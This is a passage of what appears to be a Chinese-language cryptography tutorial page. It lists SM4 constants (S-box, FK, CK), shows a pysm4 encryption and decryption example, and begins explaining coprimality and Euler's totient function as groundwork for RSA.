class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>系统参数 FK 固定</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> FK[<span class="number">4</span>] = &#123;<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>固定参数 CK 固定</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> CK[<span class="number">32</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="使用python库对SM4算法进行解密">使用python库对SM4算法进行解密<a class="header-anchor" href="#使用python库对SM4算法进行解密"> ¶ </a></h3>
<p>标准128位加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pysm4 import encrypt, decrypt</span><br><span class="line"># 明文</span><br><span class="line">&gt;&gt;&gt; clear_num = 0x0123456789abcdeffedcba9876543210</span><br><span class="line"># 密钥</span><br><span class="line">&gt;&gt;&gt; mk = 0x0123456789abcdeffedcba9876543210</span><br><span class="line"># 加密</span><br><span class="line">&gt;&gt;&gt; cipher_num = encrypt(clear_num, mk)</span><br><span class="line">&gt;&gt;&gt; hex(cipher_num)[2:].replace(&#x27;L&#x27;, &#x27;&#x27;)</span><br><span class="line">&#x27;681edf34d206965e86b3e94f536e4246&#x27;</span><br><span class="line"># 解密</span><br><span class="line">&gt;&gt;&gt; clear_num == decrypt(cipher_num, mk)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<h1 id="非对称密码">非对称密码<a class="header-anchor" href="#非对称密码"> ¶ </a></h1>
<h2 id="RSA">RSA<a class="header-anchor" href="#RSA"> ¶ </a></h2>
<h3 id="基本原理">基本原理<a class="header-anchor" href="#基本原理"> ¶ </a></h3>
<h4 id="前置数学知识">前置数学知识<a class="header-anchor" href="#前置数学知识"> ¶ </a></h4>
<h5 id="互质关系">互质关系<a class="header-anchor" href="#互质关系"> ¶ </a></h5>
<p>如果两个正整数，除了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>以外，没有其他公因子，我们就称这两个数是<em>互质关系</em></p>
<ol>
<li>不是质数也可以构成互质关系，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>15</mn></mrow><annotation encoding="application/x-tex">15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn></mrow><annotation encoding="application/x-tex">32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span>。</li>
<li>任意两个质数构成互质关系，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>13</mn></mrow><annotation encoding="application/x-tex">13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">13</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>61</mn></mrow><annotation encoding="application/x-tex">61</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">61</span></span></span></span>。</li>
<li>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>。</li>
<li>如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>97</mn></mrow><annotation encoding="application/x-tex">97</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">97</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>57</mn></mrow><annotation encoding="application/x-tex">57</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">57</span></span></span></span>。</li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>和任意一个自然数是都是互质关系，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>99</mn></mrow><annotation encoding="application/x-tex">99</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">99</span></span></span></span>。</li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>是大于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>的整数，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>构成互质关系，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>57</mn></mrow><annotation encoding="application/x-tex">57</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">57</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>56</mn></mrow><annotation encoding="application/x-tex">56</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">56</span></span></span></span>。</li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>是大于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>的奇数，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">p-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>构成互质关系，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>17</mn></mrow><annotation encoding="application/x-tex">17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">17</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>15</mn></mrow><annotation encoding="application/x-tex">15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>。</li>
</ol>
<h5 id="欧拉函数">欧拉函数<a class="header-anchor" href="#欧拉函数"> ¶ </a></h5>
<p>任意给定正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，在小于等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>的正整数之中，能与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>构成互质关系的数 的个数；计算这个值的方法叫做欧拉函数，以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>表示。</p>
<ol>
<li>如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\varphi(1) = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 。因为1与任何数（包括自身）都构成互质关系</li>
<li><strong>如果n是质数，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\varphi(1) = n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 。因为质数与小于它的每一个数，都构成互质关系</strong></li>
<li>如果n是质数的某一个次方，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mi>p</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">n = p^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span> (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>为质数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>为大于等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>的整数)，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>k</mi></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>p</mi><mi>k</mi></msup><mo>−</mo><msup><mi>p</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\varphi(p^k) = p^k - p^{k-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>；也可以写成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>k</mi></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>p</mi><mi>k</mi></msup><mo>−</mo><msup><mi>p</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><msup><mi>p</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><mi>p</mi></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(p^k)=p^k-p^{k-1}=p^k(1-\frac1p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.3262em;vertical-align:-0.4811em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4811em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span></li>
